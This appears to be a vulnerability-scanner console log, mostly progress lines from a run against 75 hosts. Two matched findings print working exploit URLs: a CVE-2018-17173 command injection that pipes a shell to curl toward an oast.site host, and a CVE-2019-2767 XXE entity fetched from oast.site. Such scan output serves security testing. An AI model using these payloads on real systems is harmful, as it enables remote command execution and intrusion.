[+] Started: Wed Jul 29 08:20:31 UTC 2026
[+] Run ID: 30418560689
[+] Batch: batch-0010
[+] URL count: 75
[0:00:05] | Templates: 6780 | Hosts: 75 | RPS: 58 | Matched: 0 | Errors: 0 | Requests: 306/1125900 (0%)
[0:06:30] | Templates: 6780 | Hosts: 75 | RPS: 69 | Matched: 2 | Errors: 150 | Requests: 27230/1125900 (2%)
[0:06:35] | Templates: 6780 | Hosts: 75 | RPS: 70 | Matched: 2 | Errors: 150 | Requests: 27683/1125900 (2%)
[0:06:40] | Templates: 6780 | Hosts: 75 | RPS: 70 | Matched: 2 | Errors: 150 | Requests: 28238/1125900 (2%)
[0:06:45] | Templates: 6780 | Hosts: 75 | RPS: 71 | Matched: 2 | Errors: 150 | Requests: 28833/1125900 (2%)
[0:06:50] | Templates: 6780 | Hosts: 75 | RPS: 71 | Matched: 2 | Errors: 150 | Requests: 29451/1125900 (2%)
[0:06:55] | Templates: 6780 | Hosts: 75 | RPS: 72 | Matched: 2 | Errors: 150 | Requests: 30137/1125900 (2%)
[0:07:00] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 150 | Requests: 30832/1125900 (2%)
[0:07:05] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 150 | Requests: 31533/1125900 (2%)
[0:07:10] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 150 | Requests: 32236/1125900 (2%)
[0:07:15] | Templates: 6780 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 150 | Requests: 32970/1125900 (2%)
[0:07:20] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 150 | Requests: 33607/1125900 (2%)
[0:07:25] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 150 | Requests: 34077/1125900 (3%)
[0:07:30] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 154 | Requests: 34557/1125900 (3%)
[0:07:35] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 158 | Requests: 35042/1125900 (3%)
[0:07:40] | Templates: 6780 | Hosts: 75 | RPS: 77 | Matched: 2 | Errors: 162 | Requests: 35451/1125900 (3%)
[0:07:45] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 162 | Requests: 35799/1125900 (3%)
[0:07:50] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 162 | Requests: 36102/1125900 (3%)
[0:07:55] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 166 | Requests: 36407/1125900 (3%)
[0:08:00] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 166 | Requests: 36772/1125900 (3%)
[0:08:05] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 174 | Requests: 37142/1125900 (3%)
[0:08:10] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 174 | Requests: 37469/1125900 (3%)
[0:08:15] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 174 | Requests: 37799/1125900 (3%)
[0:08:20] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 174 | Requests: 38160/1125900 (3%)
[0:08:25] | Templates: 6780 | Hosts: 75 | RPS: 76 | Matched: 2 | Errors: 174 | Requests: 38468/1125900 (3%)
[0:08:30] | Templates: 6780 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 176 | Requests: 38726/1125900 (3%)
[0:08:35] | Templates: 6780 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 180 | Requests: 39031/1125900 (3%)
[0:08:40] | Templates: 6780 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 188 | Requests: 39335/1125900 (3%)
[0:08:45] | Templates: 6780 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 188 | Requests: 39609/1125900 (3%)
[0:08:50] | Templates: 6780 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 188 | Requests: 39882/1125900 (3%)
[0:08:55] | Templates: 6780 | Hosts: 75 | RPS: 75 | Matched: 2 | Errors: 188 | Requests: 40148/1125900 (3%)
[0:09:00] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 188 | Requests: 40405/1125900 (3%)
[0:09:05] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 188 | Requests: 40663/1125900 (3%)
[0:09:10] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 190 | Requests: 40936/1125900 (3%)
[0:09:15] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 190 | Requests: 41199/1125900 (3%)
[0:09:20] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 190 | Requests: 41485/1125900 (3%)
[0:09:25] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 190 | Requests: 41782/1125900 (3%)
[0:09:30] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 190 | Requests: 42177/1125900 (3%)
[0:09:35] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 192 | Requests: 42523/1125900 (3%)
[0:09:40] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 2 | Errors: 197 | Requests: 42892/1125900 (3%)
[0:09:45] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 199 | Requests: 43340/1125900 (3%)
[0:09:50] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 199 | Requests: 43799/1125900 (3%)
[0:09:55] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 199 | Requests: 44296/1125900 (3%)
[0:10:00] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 2 | Errors: 199 | Requests: 44749/1125900 (3%)
[[92mCVE-2018-17173[0m] [[94mhttp[0m] [[31mcritical[0m] https://fakevod.ant.fun/qsr_server/device/getThumbnail?sourceUri=\'%2b-%253brm%2b/tmp/f%253bmkfifo%2b/tmp/f%253bcat%2b/tmp/f|/bin/sh%2b-i%2b2>%25261|curl%2bhttp%253a//d9krflklr2r3erlen4lgozkxugciwpx4i.oast.site%2b>/tmp/f%253b\';&targetUri=%2Ftmp%2Fthumb%2Ftest.jpg&mediaType=image&targetWidth=400&targetHeight=400&scaleType=crop&_=1537275717150
[0:10:05] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 201 | Requests: 45211/1125900 (4%)
[0:10:10] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 201 | Requests: 45600/1125900 (4%)
[0:10:15] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 201 | Requests: 45955/1125900 (4%)
[0:10:20] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 201 | Requests: 46261/1125900 (4%)
[0:10:25] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 209 | Requests: 46638/1125900 (4%)
[0:10:30] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 211 | Requests: 46995/1125900 (4%)
[0:10:35] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 213 | Requests: 47345/1125900 (4%)
[0:10:40] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 213 | Requests: 47753/1125900 (4%)
[0:10:45] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 213 | Requests: 48173/1125900 (4%)
[0:10:50] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 213 | Requests: 48714/1125900 (4%)
[0:10:55] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 213 | Requests: 48924/1125900 (4%)
[0:11:00] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 213 | Requests: 49287/1125900 (4%)
[0:11:05] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 213 | Requests: 49605/1125900 (4%)
[0:11:10] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 216 | Requests: 49923/1125900 (4%)
[0:11:15] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 218 | Requests: 50263/1125900 (4%)
[0:11:20] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 218 | Requests: 50599/1125900 (4%)
[0:11:25] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 218 | Requests: 50884/1125900 (4%)
[0:11:30] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 218 | Requests: 51169/1125900 (4%)
[0:11:35] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 220 | Requests: 51484/1125900 (4%)
[0:11:40] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 220 | Requests: 51793/1125900 (4%)
[0:11:45] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 220 | Requests: 51921/1125900 (4%)
[0:11:50] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 220 | Requests: 52268/1125900 (4%)
[0:11:55] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 220 | Requests: 52566/1125900 (4%)
[0:12:00] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 222 | Requests: 52877/1125900 (4%)
[0:12:05] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 222 | Requests: 53181/1125900 (4%)
[0:12:10] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 254 | Requests: 53516/1125900 (4%)
[0:12:15] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 254 | Requests: 53791/1125900 (4%)
[0:12:20] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 256 | Requests: 54135/1125900 (4%)
[0:12:25] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 256 | Requests: 54529/1125900 (4%)
[0:12:30] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 260 | Requests: 54979/1125900 (4%)
[0:12:35] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 272 | Requests: 55500/1125900 (4%)
[0:12:40] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 272 | Requests: 55951/1125900 (4%)
[0:12:45] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 276 | Requests: 56497/1125900 (5%)
[0:12:50] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 278 | Requests: 56915/1125900 (5%)
[0:12:55] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 290 | Requests: 57296/1125900 (5%)
[0:13:00] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 295 | Requests: 57667/1125900 (5%)
[0:13:05] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 299 | Requests: 58003/1125900 (5%)
[0:13:10] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 303 | Requests: 58368/1125900 (5%)
[0:13:15] | Templates: 6780 | Hosts: 75 | RPS: 73 | Matched: 3 | Errors: 303 | Requests: 58692/1125900 (5%)
[0:13:20] | Templates: 6780 | Hosts: 75 | RPS: 74 | Matched: 3 | Errors: 313 | Requests: 59717/1125900 (5%)
[0:13:25] | Templates: 6780 | Hosts: 75 | RPS: 77 | Matched: 3 | Errors: 317 | Requests: 62215/1125900 (5%)
[0:13:30] | Templates: 6780 | Hosts: 75 | RPS: 80 | Matched: 3 | Errors: 324 | Requests: 64929/1125900 (5%)
[0:13:35] | Templates: 6780 | Hosts: 75 | RPS: 82 | Matched: 3 | Errors: 328 | Requests: 67438/1125900 (5%)
[0:13:40] | Templates: 6780 | Hosts: 75 | RPS: 85 | Matched: 3 | Errors: 343 | Requests: 70167/1125900 (6%)
[0:13:45] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 361 | Requests: 72675/1125900 (6%)
[0:13:50] | Templates: 6780 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 367 | Requests: 75114/1125900 (6%)
[0:13:55] | Templates: 6780 | Hosts: 75 | RPS: 91 | Matched: 3 | Errors: 367 | Requests: 76175/1125900 (6%)
[0:14:00] | Templates: 6780 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 367 | Requests: 76455/1125900 (6%)
[0:14:05] | Templates: 6780 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 383 | Requests: 76742/1125900 (6%)
[0:14:10] | Templates: 6780 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 393 | Requests: 77040/1125900 (6%)
[0:14:15] | Templates: 6780 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 393 | Requests: 77311/1125900 (6%)
[0:14:20] | Templates: 6780 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 393 | Requests: 77615/1125900 (6%)
[0:14:25] | Templates: 6780 | Hosts: 75 | RPS: 90 | Matched: 3 | Errors: 399 | Requests: 77911/1125900 (6%)
[0:14:30] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 413 | Requests: 78270/1125900 (6%)
[0:14:35] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 423 | Requests: 78609/1125900 (6%)
[0:14:40] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 437 | Requests: 78923/1125900 (7%)
[0:14:45] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 437 | Requests: 79266/1125900 (7%)
[0:14:50] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 447 | Requests: 79533/1125900 (7%)
[0:14:55] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 451 | Requests: 79877/1125900 (7%)
[0:15:00] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 453 | Requests: 80241/1125900 (7%)
[0:15:05] | Templates: 6780 | Hosts: 75 | RPS: 89 | Matched: 3 | Errors: 453 | Requests: 80596/1125900 (7%)
[0:15:10] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 457 | Requests: 80958/1125900 (7%)
[0:15:15] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 459 | Requests: 81311/1125900 (7%)
[0:15:20] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 3 | Errors: 461 | Requests: 81660/1125900 (7%)
[[92mCVE-2019-2767[0m] [[94mhttp[0m] [[38;5;208mhigh[0m] https://fakevod.ant.fun/xmlpserver/convert?xml=<%3fxml+version%3d"1.0"+%3f><!DOCTYPE+r+[<!ELEMENT+r+ANY+><!ENTITY+%25+sp+SYSTEM+"http%3a//d9krflklr2r3erlen4lgig4rtqxmy96q8.oast.site/xxe.xml">%25sp%3b%25param1%3b]>&_xf=Excel&_xl=123&template=123
[0:15:25] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 461 | Requests: 81974/1125900 (7%)
[0:15:30] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 461 | Requests: 82445/1125900 (7%)
[0:15:35] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 461 | Requests: 82914/1125900 (7%)
[0:15:40] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 461 | Requests: 83394/1125900 (7%)
[0:15:45] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 461 | Requests: 83937/1125900 (7%)
[0:15:50] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 461 | Requests: 84450/1125900 (7%)
[0:15:55] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 465 | Requests: 84999/1125900 (7%)
[0:16:00] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 467 | Requests: 85393/1125900 (7%)
[0:16:05] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 469 | Requests: 85706/1125900 (7%)
[0:16:10] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 471 | Requests: 86022/1125900 (7%)
[0:16:15] | Templates: 6780 | Hosts: 75 | RPS: 88 | Matched: 4 | Errors: 471 | Requests: 86358/1125900 (7%)
